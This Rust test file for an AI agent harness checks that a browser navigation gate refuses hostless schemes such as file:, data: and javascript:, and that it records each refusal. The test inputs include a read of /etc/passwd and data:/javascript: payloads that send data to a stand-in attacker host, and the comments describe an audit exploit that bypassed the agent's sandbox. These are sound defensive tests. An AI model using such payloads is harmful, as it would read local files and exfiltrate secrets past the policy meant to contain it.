//! H6 — the schemes the navigation gate could not see (0.74.0).
//!
//! Every document navigation is decided at the paused request. A URL that names
//! no host opens no request, so for `file:`, `data:`, `blob:` and `javascript:`
//! the gate did not run, `NavGate::permits` answered *permitted* for the `None`
//! it was handed, and no `Decision` was recorded. That last part is the finding:
//! a `browser_navigate` to `file:///…` read a file past `Act::Read` and past
//! every secret deny, and the trace held no row saying it had happened.
//!
//! Asserted the way `tests/browser.rs` asserts: on **what the browser was told**.
//! The fixture records a line per `Page.navigate` it receives, so a build that
//! reported a refusal after sending the command would fail here even though its
//! error text read correctly.
//!
//! The companions matter as much as the refusals. A scheme allowlist is the
//! change most able to break the ordinary case, so `about:blank` and a permitted
//! `https://` host each have a test saying they still work — and the second one
//! also says a permitted navigation is still decided exactly once, at the
//! request, rather than twice now that there is a second gate.

#![cfg(feature = "browser")]

use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

use io_harness::observe::{EventKind, Flow, Observer, RunEvent};
use io_harness::provider::{CompletionRequest, CompletionResponse, ToolCall};
use io_harness::{
    run_with_observed, ApproveAll, BrowserConfig, Policy, Provider, Store, TaskContract,
    Verification,
};
use serde_json::{json, Value};

/// Where `cargo test` left the fixture binary. `tests/browser.rs` explains the
/// shape; the assertion message is the same because the failure is the same.
fn fixture_browser() -> PathBuf {
    let mut dir = std::env::current_exe().expect("the test binary has a path");
    dir.pop();
    if dir.ends_with("deps") {
        dir.pop();
    }
    let exe = format!("browser_fixture{}", std::env::consts::EXE_SUFFIX);
    let path = dir.join("examples").join(&exe);
    assert!(
        path.exists(),
        "fixture browser not built at {}. `cargo test` builds examples; run \
         `cargo build --features browser --example browser_fixture` if invoking the \
         test binary directly.",
        path.display()
    );
    path
}

struct Script {
    steps: Vec<Vec<ToolCall>>,
    at: AtomicUsize,
    seen: Mutex<Vec<String>>,
}

impl Script {
    fn new(steps: Vec<Vec<ToolCall>>) -> Self {
        Self {
            steps,
            at: AtomicUsize::new(0),
            seen: Mutex::new(Vec::new()),
        }
    }

    /// Everything the model was shown, which is where an observation has to
    /// arrive for the refusal to have been reported at all.
    fn transcript(&self) -> String {
        self.seen.lock().unwrap().join("\n")
    }
}

impl Provider for Script {
    fn name(&self) -> &str {
        "script"
    }

    async fn complete(&self, request: CompletionRequest) -> io_harness::Result<CompletionResponse> {
        self.seen.lock().unwrap().push(request.user.clone());
        let i = self.at.fetch_add(1, Ordering::SeqCst);
        Ok(CompletionResponse {
            tool_calls: self.steps.get(i).cloned().unwrap_or_default(),
            ..Default::default()
        })
    }
}

fn call(name: &str, args: Value) -> ToolCall {
    ToolCall {
        name: name.into(),
        arguments: args,
    }
}

/// A record file the fixture appends to, and a reader for it.
struct Record(PathBuf);

impl Record {
    fn new(dir: &Path) -> Self {
        Self(dir.join("fixture-record.txt"))
    }

    fn lines(&self) -> Vec<String> {
        std::fs::read_to_string(&self.0)
            .unwrap_or_default()
            .lines()
            .map(str::to_string)
            .collect()
    }
}

fn fixture_config(record: &Record) -> BrowserConfig {
    BrowserConfig::default()
        .with_binary(fixture_browser().display().to_string())
        .with_args(vec![format!("--io-fixture-record={}", record.0.display())])
        .with_timeout(std::time::Duration::from_secs(5))
}

fn permitted() -> Policy {
    Policy::default()
        .layer("app")
        .allow_read("*")
        .allow_write("*")
        .allow_exec("*")
}

fn contract(root: &Path) -> TaskContract {
    TaskContract::workspace("look at the page", root)
        .with_verification(Verification::WorkspaceFileContains {
            file: "done.txt".into(),
            needle: "ok".into(),
        })
        .with_max_steps(6)
}

fn finish() -> Vec<ToolCall> {
    vec![call(
        "write_file",
        json!({"path": "done.txt", "content": "ok"}),
    )]
}

#[derive(Default)]
struct Events(Mutex<Vec<RunEvent>>);

impl Observer for Events {
    fn event(&self, event: &RunEvent) -> Flow {
        self.0.lock().unwrap().push(event.clone());
        Flow::Continue
    }
}

impl Events {
    fn navigations(&self) -> Vec<(String, bool)> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::BrowserNavigated { host, permitted } => Some((host.clone(), *permitted)),
                _ => None,
            })
            .collect()
    }
}

/// One `browser_navigate` to `url` under `policy`, then a finishing write.
///
/// Hands back what the browser was told, what the run recorded, and what the
/// model read — the three places a scheme decision has to show up.
async fn navigate_to(url: &str, policy: Policy) -> (Vec<String>, Vec<(String, bool)>, String) {
    let dir = tempfile::tempdir().unwrap();
    let record = Record::new(dir.path());
    let script = Script::new(vec![
        vec![call("browser_navigate", json!({ "url": url }))],
        finish(),
    ]);
    let events = Events::default();
    let store = Store::memory().unwrap();

    run_with_observed(
        &contract(dir.path()).with_browser(fixture_config(&record)),
        &script,
        &store,
        &policy,
        &ApproveAll,
        &events,
    )
    .await
    .unwrap();

    (record.lines(), events.navigations(), script.transcript())
}

// ---------------------------------------------------------------------------
// H6 — the schemes that reach something the request gate never sees
// ---------------------------------------------------------------------------

/// Every scheme the audit names, plus two nobody named.
///
/// `ftp:` and `view-source:` are in the list because the rule is an allowlist
/// rather than a set of known-bad schemes. A blocklist fails open on the case its
/// author did not think of, and that case is the one that matters.
#[tokio::test]
async fn h6_a_navigation_to_a_scheme_that_names_no_host_is_refused_and_recorded() {
    for (url, label) in [
        ("file:///etc/passwd", "file:"),
        ("data:text/html,<h1>hi</h1>", "data:"),
        ("blob:https://example.com/6f8a-4c11", "blob:"),
        (
            "javascript:fetch('https://attacker.example.com')",
            "javascript:",
        ),
        ("ftp://files.example.com/x", "ftp:"),
        ("view-source:https://example.com/", "view-source:"),
    ] {
        let (lines, navigations, transcript) = navigate_to(url, permitted().allow_net("*")).await;

        assert!(
            !lines.iter().any(|l| l.starts_with("navigate ")),
            "the browser was told to go to {url} anyway: {lines:?}"
        );
        assert!(
            navigations.contains(&(label.to_string(), false)),
            "{url} recorded no refusal — no row is the shape of the whole finding: \
             {navigations:?}"
        );
        assert!(
            transcript.contains("refused") && transcript.contains(label),
            "the model was not told {url} was refused: {transcript}"
        );
    }
}

/// The URL itself never reaches the trace or the model — only its scheme.
///
/// A `data:` URL *is* its payload and a `javascript:` URL is a program, so
/// echoing either back would copy the refused thing into two places it was
/// refused from reaching.
#[tokio::test]
async fn h6_a_refusal_names_the_scheme_and_does_not_echo_the_payload() {
    let url =
        "data:text/html,<script>navigator.sendBeacon('https://attacker.example.com')</script>";
    let (_lines, navigations, transcript) = navigate_to(url, permitted().allow_net("*")).await;

    assert!(navigations.contains(&("data:".to_string(), false)));
    assert!(
        !transcript.contains("sendBeacon"),
        "the payload was echoed back: {transcript}"
    );
}

/// Exploit B, under the policy it was written against.
///
/// A `data:` document's subresources are not intercepted — `Fetch.enable` pauses
/// document requests, and an `<img>` inside a page this process authored the
/// origin of is not one — so the request left the machine under a policy that
/// denied the network. It cannot now, because the document never loads: there is
/// no page for the subresource to be a subresource of.
#[tokio::test]
async fn h6_a_data_document_cannot_be_opened_under_a_net_deny_policy() {
    let url = "data:text/html,<img src=\"https://attacker.example.com/?d=secret\">";
    let (lines, navigations, _transcript) = navigate_to(url, permitted().deny_net("*")).await;

    assert!(
        !lines.iter().any(|l| l.starts_with("navigate ")),
        "the data: document was loaded: {lines:?}"
    );
    assert!(navigations.contains(&("data:".to_string(), false)));
}

// ---------------------------------------------------------------------------
// The companions — what must keep working
// ---------------------------------------------------------------------------

/// `about:blank` is the empty page the browser is already opened on. It reads
/// nothing and reaches nothing, and a run that wants to leave a page has nowhere
/// else to go, so it is the one hostless scheme on the allowlist.
#[tokio::test]
async fn about_blank_remains_permitted_and_is_recorded_as_permitted() {
    let (lines, navigations, transcript) =
        navigate_to("about:blank", permitted().allow_net("*")).await;

    assert!(
        lines.iter().any(|l| l.contains("navigate about:blank")),
        "the browser was never sent to the blank page: {lines:?}"
    );
    assert!(
        navigations.contains(&("about:".to_string(), true)),
        "the permitted case is recorded too: {navigations:?}"
    );
    assert!(
        !transcript.contains("refused"),
        "an allowed navigation was reported as a refusal: {transcript}"
    );
}

/// The control. A permitted host is still decided at the paused request, and
/// still decided exactly *once* — the scheme gate answers about schemes and
/// leaves a URL that names a host to the gate that was already there.
#[tokio::test]
async fn a_permitted_host_is_still_reached_and_decided_once() {
    let (lines, navigations, _transcript) = navigate_to(
        "https://allowed.example.com/page",
        permitted().allow_net("allowed.example.com"),
    )
    .await;

    assert!(
        lines.iter().any(|l| l.contains("continue ")),
        "the permitted host was not continued: {lines:?}"
    );
    assert_eq!(
        navigations,
        vec![("allowed.example.com:443".to_string(), true)],
        "a navigation to a host is decided once, at the request"
    );
}

/// The other control: a denied *host* is still refused at the request, which is
/// the path the scheme gate must not have taken over.
#[tokio::test]
async fn a_denied_host_is_still_refused_at_the_request() {
    let (lines, navigations, _transcript) = navigate_to(
        "https://blocked.example.com/page",
        permitted().allow_net("allowed.example.com"),
    )
    .await;

    assert!(
        lines.iter().any(|l| l.contains("fail ")),
        "the browser was not told to block the request: {lines:?}"
    );
    assert_eq!(
        navigations,
        vec![("blocked.example.com:443".to_string(), false)]
    );
}
